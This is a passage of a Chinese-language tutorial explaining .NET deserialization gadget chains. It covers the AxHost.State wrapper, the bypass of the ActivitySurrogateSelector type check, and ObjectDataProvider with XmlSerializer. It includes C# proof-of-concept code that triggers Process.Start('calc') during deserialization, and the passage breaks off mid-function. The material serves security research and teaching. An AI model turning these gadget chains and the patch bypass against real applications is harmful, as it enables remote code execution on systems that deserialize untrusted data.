@@ -1,0 +1,261 @@
+基本上和我们前面所讲的一致。
+特殊的是我们构造了一个PayloadClass类，然后序列化PayloadClass 实例，作为最终的payload。
+我们在PayloadClass类的GetObjectData() 函数里设置如下:
+    public void GetObjectData(SerializationInfo info, StreamingContext context)
+    {
+        System.Diagnostics.Trace.WriteLine("In GetObjectData");
+        info.SetType(typeof(System.Windows.Forms.AxHost.State));
+        info.AddValue("PropertyBagBinary", GadgetChains());
+    }
+关键的就是 info.SetType() 和 info.AddValue() 函数的调用。我们之前了解过，GetObjectData用于在序列化时
+从对象实例里提取数据。那么这里就相当于序列化的实际上是一个
+System.Windows.Forms.AxHost.State类型，并且其PropertyBagBinary
+字段被设置为我们生成的payload链。为什么要这么做？为什么要多加一层？
+看过AxHost.State源码就明白了：
+    /**
+     * Constructor used in deserialization
+     */
+    protected State(SerializationInfo info, StreamingContext context) {
+        SerializationInfoEnumerator sie = info.GetEnumerator();
+        if (sie == null) {
+            return;
+        }
+        for (; sie.MoveNext();) {
+            if (String.Compare(sie.Name, "Data", true, CultureInfo.InvariantCulture) == 0) {
+                ...
+            }
+            else if (String.Compare(sie.Name, "PropertyBagBinary", true, CultureInfo.InvariantCulture) == 0) {
+                try {
+                    Debug.WriteLineIf(AxHTraceSwitch.TraceVerbose, "Loading up property bag from stream...");
+                    byte[] dat = (byte[])sie.Value;
+                    if (dat != null) {
+                        this.propBag = new PropertyBagStream();
+                        propBag.Read(new MemoryStream(dat));
+                    }
+                }
+                catch (Exception e) {
+                    Debug.Fail("failure: " + e.ToString());
+                }
+            }
+        }
+    }
+开头注释已经表明，该State函数用于反序列化时的重构。从SerializationInfo里提取 PropertyBagBinary
+字段的值并发送给了proBag.Read()函数。我们再来看 propBag.Read 函数：
+    internal void Read(Stream stream) {
+        BinaryFormatter formatter = new BinaryFormatter();
+        try {
+            bag = (Hashtable)formatter.Deserialize(stream);
+        }
+        catch {
+            // Error reading.  Just init an empty hashtable.
+            bag = new Hashtable();
+        }
+    }
+很明显了，这里将PropertyBagBinary的值传给了 BinaryFormatter.Deserialize() 。特殊的是反序列化外面加了一个
+try catch，这样的好处就是当我们的payload在反序列化时发生的异常不会被转发给上一层。
+当然，我们也可以在 GadgetChains() 函数末尾，直接反序列化生成的
+payload，一样可以执行代码，只是执行完代码后会报错而已。这也体现了外面再增加一层的作用。
+### 0x50 补丁与绕过
+在前文代码中，无论是序列化还是反序列化之前，我们都掉调用了以下代码：
+    System.Configuration.ConfigurationManager.AppSettings.Set("microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck", "true");
+这是因为从 .NET 4.8 开始，微软修复了ActivitySurrogateSelector
+的漏洞。具体细节在ObjectSurrogate.GetObjectData() 函数里：
+    private sealed class ObjectSurrogate : ISerializationSurrogate
+    {
+        public void GetObjectData(object obj, SerializationInfo info, StreamingContext context)
+        {
+            // We only use ObjectSurrogate for ActivityBind and DependecyObject
+            if (!AppSettings.DisableActivitySurrogateSelectorTypeCheck &&
+                !(obj is ActivityBind) &&
+                !(obj is DependencyObject)
+               )
+            {
+                throw new ArgumentException("obj");
+            }
+            ...
+        }
+    }
+可以看到这里有一个检查：如果没有设置AppSettings.DisableActivitySurrogateSelectorTypeCheck
+标志，且被序列化的类型既不是ActivityBind 又不是 DependencyObject ，则直接抛出异常。
+所以我们前面直接使用ConfigurationManager 设置了这个标志位为true，表示关闭检查。但是在实际环境中又该怎么办呢？
+Nick Landers 在《[Re-Animating
+ActivitySurrogateSelector](https://silentbreaksecurity.com/re-animating-activitysurrogateselector/)》一文中设计了关闭该检查的payload。该payload已被整合到 ysoserial.net
+工具中的ActivitySurrogateDisableTypeCheck 部件。
+该payload的原理并不复杂，但设计到ObjectDataProvider、Xaml和TextFormattingRunProperties
+多个知识点，所以我们将他放到第四章《TextFormattingRunProperties 工具链》里面讲解。
+## 三.ObjectDataProvider工具链
+> ObjectDataProvider实例在经XmlSerializer之类的工具反序列化时，可以触发执行被包含类型的指定函数。
+### 0x10 ObjectDataProvider介绍
+ObjectDataProvider的官方介绍是：“包装和创建 **可以用作绑定源的对象** ”。嗯，完全没明白。。。
+那么先来一小段代码看一下 ObjectDataProvider的特点：
+    var objDat = new ObjectDataProvider();
+    objDat.ObjectInstance = new System.Diagnostics.Process();
+    objDat.MethodParameters.Add("calc");
+    objDat.MethodName = "Start";
+我们将ObjectDataProvider 实例的 ObjectInstance字段设置为一个Process实例，然后将MethodParameters
+字段设置为"calc"，然后将MethodName字段设置为"Start"。当你运行完这段代码，你会发现弹出了一个计算器。
+看起来是似乎是以 ObjectInstance的值
+为对象实例，以MethodParameters的值为方法，以MethodParameters的值为方法参数，进行了一次函数调用。
+那么其触发函数执行原理是什么？这么设计的目的又是什么？
+#### 0x11 ObjectDataProvider 原理
+使用dnspy调试，给要执行的函数下个断点：
+查看调用堆栈，可以看到调用路径是 Refresh() -> BeginQuery() -> QueryWorker() ->
+InvokeMethodOnInstance() 。
+InvokeMethodOnInstance() 函数名已经揭露了一切。查看一下它的代码：
+    object InvokeMethodOnInstance(out Exception e)
+    {
+        object  data = null;
+        string  error   = null; // string that describes known error
+        e = null;
+        Debug.Assert(_objectType != null);
+        object[] parameters = new object[_methodParameters.Count];
+        _methodParameters.CopyTo(parameters, 0);
+        ...
+        try
+        {
+            data = _objectType.InvokeMember(MethodName,
+                s_invokeMethodFlags, null, _objectInstance, parameters,
+                System.Globalization.CultureInfo.InvariantCulture);
+        };
+        ...
+    }
+通过反射调用了 MethodName字段中存储的目标函数。
+通过调用路径我们知道，InvokeMethodOnInstance() 的调用源自于 Refresh() 函数。我们看一下 Refresh()
+在什么情况下被调用：
+类似于上面这种，在ObjectType、ObjectInstance、MethodName 属性的set方法中都调用Refresh()
+函数。很明显，当我们修改或设置这些属性时，会触发调用Refresh() 函数，以进一步检查是否需要调用MethodName中设置的目标函数。
+除了set方法里，还有以下两处地方调用了Refresh() 函数:
+下面是ObjectDataProvider 的构造函数：
+ParameterCollectionChanged 是一个委托类型：
+    internal delegate void ParameterCollectionChanged(ParameterCollection parameters);
+而ParameterCollection() 类型则继承于 Collection 类型，并且重载了其ClearItems()、
+InsertItem()、RemoveItem()、SetItem()方法，在其中添加了对 OnCollectionChanged()的调用：
+这样当ParameterCollection实例（如字段_methodParameters）调用Add方法时，就会调用InsertItem()
+函数，进而调用OnCollectionChanged() 函数，再进而调用Refresh() 函数，然后就会检查是否需要执行目标函数了。
+#### 0x12 ObjectDataProvider 正常用法
+看完ObjectDataProvider的特点和原理，我不禁要问这个类到底是用来干什么的？所谓 “包装和创建 可以用作绑定源的对象” 是什么意思？
+首先推荐看这篇[《WPF之Binding深入探讨》](https://blog.csdn.net/fwj380891124/article/details/8107646)，看完后会对绑定有一个具体的理解。下面我来做一个简陋的总结：
+我们以UI界面显示数据为例：数据源是相对于UI界面来说的。一个UI界面需要展示数据，该数据可能来自于某个类的某个属性。为了让该属性在变化时自动反映在UI界面上，我们采用Binding的方式将数据源与目标进行绑定。Biinding是一种自动机制，会监听数据源的PropertyChanged事件。当数据源的值发生变化时，就会激发PropertyChanged事件，Binding接收到事件后就会通知Binding的目标端（即UI界面）展示新的值。
+如果数据源不是通过属性，而是通过方法暴漏给外界的时候，我们就使用ObjectDataProvider将其包装为数据源。所以ObjectDataProvider
+会监测 MethodParameters 属性的修改，同时也会监测ObjectType、ObjectInstance、MethodName
+的修改，以对方法的变化随时做出响应。当以上这些属性修改时，就会重新调用目标函数。
+通过上面简陋的描述，我们算是对ObjectDataProvider 有了一个具体的认识：我们使用ObjectDataProvider
+指定某个实例的某个方法，当添加或修改methodParameters
+时就会触发执行目标函数了。如果我们在反序列化时也能触发目标函数的调用，就可以实现代码执行了。
+### 0x20 序列化 ObjectDataProvider
+#### 0x21 不成功的尝试
+> 尽管前辈们早已做出了完整的ObjectDataProvider利用链，但我还是想再做一些蹩脚的尝试。
+首先我们知道 ObjectDataProvider类没有 [Seriable] 特性，所以它是一个不可序列化类，不能使用BinaryFormatter
+之类的工具进行序列化（当然我们还可以使用XmlSerializer之类的工具进行序列化）。但我们在上一篇关于ActivitySurrogateSelectorGenerator工具链的文章中知道，使用
+ObjectSurrogate 作为代理器可以序列化原本不可序列化的类。那如果我们使用这种方式去序列化 ObjectDataProvider
+会怎么样呢？测试代码如下：
+    class MySurrogateSelector : SurrogateSelector
+    {
+        public override ISerializationSurrogate GetSurrogate(Type type,
+            StreamingContext context, out ISurrogateSelector selector)
+        {
+            selector = this;
+            if (!type.IsSerializable)
+            {
+                Type t = Type.GetType("System.Workflow.ComponentModel.Serialization.ActivitySurrogateSelector+ObjectSurrogate, System.Workflow.ComponentModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35");
+                return (ISerializationSurrogate)Activator.CreateInstance(t);
+            }
+            return base.GetSurrogate(type, context, out selector);
+        }
+    }
+    static void Surrogatetest()
+    {
+        var objDat = new ObjectDataProvider();
+        objDat.ObjectInstance = new System.Diagnostics.Process();
+        objDat.MethodParameters.Add("calc");
+        objDat.MethodName = "Start";
+        System.Configuration.ConfigurationManager.AppSettings.Set("microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck", "true");
+        BinaryFormatter fmt = new BinaryFormatter();
+        MemoryStream stm = new MemoryStream();
+        fmt.SurrogateSelector = new MySurrogateSelector();
+        fmt.Serialize(stm, objDat);
+        stm.Position = 0;
+        var fmt2 = new BinaryFormatter();
+        ObjectDataProvider result = (ObjectDataProvider)fmt2.Deserialize(stm);
+        //result.Refresh();
+    }
+这里我直接用ObjectDataProvider封装了一个 Process
+实例，并以“calc"为参数调用其Start函数。序列化能正常进行，反序列化也可以正常完成，但遗憾的是在反序列化完成后没有触发Start
+函数的调用。根据前面的分析，我们可以猜测到应该是没有调用Refresh() 函数导致的，那么我们就需要调试一下看看BinaryFormatter
+在反序列化时是如何给字段赋值的。
+可以看到，这里的rtFieldInfo 指向了 ObjectDataProvider 的 _mehodName 字段，直接通过UnsafeSetValue
+设置该字段的值。由于不是通过原始的属性或者Add方法添加值，导致了无法触发 Refresh() 函数，也就无法调用目标函数了。
+#### 0x22 使用XmlSerializer进行序列化
+**先了解一下XmlSerializer 的一般用法。**
+下面是我们自己写的一个Claculator类，我们使用XmlSerializer 序列化其实例。
+    [XmlRoot]
+    public class Calculator
+    {
+        private string _name;
+        [XmlAttribute]
+        public string Name { get => _name; set => _name = value; }
+        public int Test(string arg1, string arg2)
+        {
+            Console.WriteLine("hello world\n");
+            return 1;
+        }
+    }
+序列化代码：
+    static void normalXml()
+    {
+        var cal = new Calculator();
+        cal.Name = "test";
+        TextWriter fs = new StreamWriter("./xmlser.txt");
+        XmlSerializer serializers = new XmlSerializer(typeof(Calculator));
+        serializers.Serialize(fs, cal);
+        fs.Close();
+        var fr = new FileStream("./xmlser.txt", FileMode.Open);
+        var deserializers = new XmlSerializer(typeof(Calculator));
+        var result = (Calculator)deserializers.Deserialize(fr);
+        Console.WriteLine(result.Name);
+        fr.Close();
+    }
+上面的代码中我们以一个Calculator 实例为目标对象，对其进行序列化和反序列化。
+这里有一个关键点就是以 XmlSerializer.XmlSerializer(Type)
+的方式初始化XmlSerializer实例，需要传入被序列化对象的类型。根据官方文档，在使用这种构造函数时， _XML
+序列化基础结构会动态生成程序集以序列化和反序列化指定的类型_ 。
+在初始化XmlSerializer实例时，传入的Type类型参数保证了XmlSerializer
+对序列化中涉及到的类型都已知，并生成相应的动态程序集。但是假如序列化目标对象的某个字段实际值是该字段声明类型的派生类型，比如，某字段声明为object类型（我们知道c#里所有类型都继承于object类型），然而实际值为其他类型，就会导致报错。下面我们序列化ObjectDataProvider
+的时候就会遇到这种情况。
+**我们的目标是使用ObjectDataProvider 封装Calculator 实例，并在反序列化时自动触发Calculator 的Test 函数**
+，下面是测试代码（为什么不直接用ObjectDataProvider 封装 System.Diagnostics.Process
+实例？因为使用XmlSerializer 序列化时会报接口无法序列化的错误）:
+    static void test()
+    {
+        var objDat = new ObjectDataProvider();
+        objDat.ObjectInstance = new Calculator();
+        objDat.MethodParameters.Add("test1");
+        objDat.MethodParameters.Add("test2");
+        objDat.MethodName = "Test";
+        TextWriter fs = new StreamWriter("./xmlser.txt");
+        XmlSerializer serializers = new XmlSerializer(typeof(ObjectDataProvider));
+        serializers.Serialize(fs, objDat);
+        fs.Close();
+        var fr = new FileStream("./xmlser.txt", FileMode.Open);
+        var deserializers = new XmlSerializer(typeof(ObjectDataProvider));
+        var result = deserializers.Deserialize(fr);
+        fr.Close();
+    }
+我们以ObjectDataProvider实例作为序列化目标对象，并且在初始化XmlSerializer时传入ObjectDataProvider类型。但是在执行时会报如下错误：
+原因便是ObjectInstance 字段声明为object类型，但实际值为Calculator 类型，导致生成的动态程序集无法完成序列化：
+这时有两种解决方法：
+第一种就是使用XmlSirializer 其他的构造函数，使用以下语句进行初始化：
+    Type[] types = new Type[] { typeof(Calculator) };
+    XmlSerializer serializers = new XmlSerializer(typeof(ObjectDataProvider), types);
+传给构造函数的第二个参数表示要序列化的其他对象类型的 Type
+数组。但是这种解决方法不适合反序列化漏洞利用，我们无法保证目标程序使用这种构造函数，也无法保证我们可以控制两个参数。
+第二种就是找一个封装类型。比如下面这样的：
+    public class Wrapper
+    {
+        public A contentA{ get; set; }
+        public B contentB{ get; set; }
+    }
+Wrapper是一个我们自己设想的类型，它使用了泛型的用法，这样我们可以任意设置它的两个属性的类型为我们需要的目标类型。在以typeof(Wrapper)
+为参数初始化 XmlSerializer 时，就保证了传入需要的所有类型。测试代码如下：
+    static void ExpandTest()
+    {
